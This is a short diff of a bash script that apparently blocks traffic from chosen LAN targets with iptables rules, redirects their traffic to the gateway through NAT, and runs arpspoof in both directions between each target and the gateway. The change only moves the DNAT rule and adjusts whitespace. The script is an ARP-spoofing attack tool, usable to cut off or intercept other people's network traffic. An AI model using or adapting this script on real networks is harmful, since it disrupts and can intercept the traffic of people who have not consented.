@@ -41,10 +41,10 @@ for TARGET in $TARGET_IPS; do
         # Block all traffic
         iptables -A FORWARD -s "$TARGET" -j DROP
         iptables -A FORWARD -d "$TARGET" -j DROP
-        iptables -t nat -A PREROUTING -s "$TARGET" -j DNAT --to-destination "$GATEWAY"
         iptables -A INPUT -s "$TARGET" -j DROP
         iptables -A OUTPUT -d "$TARGET" -j DROP
-  
+        iptables -t nat -A PREROUTING -s "$TARGET" -j DNAT --to-destination "$GATEWAY"
+     
         # Expand subnet for ARP spoofing
         read HOSTMIN HOSTMAX < <(expand_subnet "$TARGET")
         if [[ -n "$HOSTMIN" && -n "$HOSTMAX" ]]; then
@@ -65,10 +65,10 @@ for TARGET in $TARGET_IPS; do
         # Single IP
         iptables -A FORWARD -s "$TARGET" -j DROP
         iptables -A FORWARD -d "$TARGET" -j DROP
-        iptables -t nat -A PREROUTING -s "$TARGET" -j DNAT --to-destination "$GATEWAY"
         iptables -A INPUT -s "$TARGET" -j DROP
         iptables -A OUTPUT -d "$TARGET" -j DROP
-        
+        iptables -t nat -A PREROUTING -s "$TARGET" -j DNAT --to-destination "$GATEWAY"
+ 
         (
             arpspoof -i "$INTERFACE" -t "$TARGET" "$GATEWAY" >/dev/null 2>&1 &
             arpspoof -i "$INTERFACE" -t "$GATEWAY" "$TARGET" >/dev/null 2>&1 &
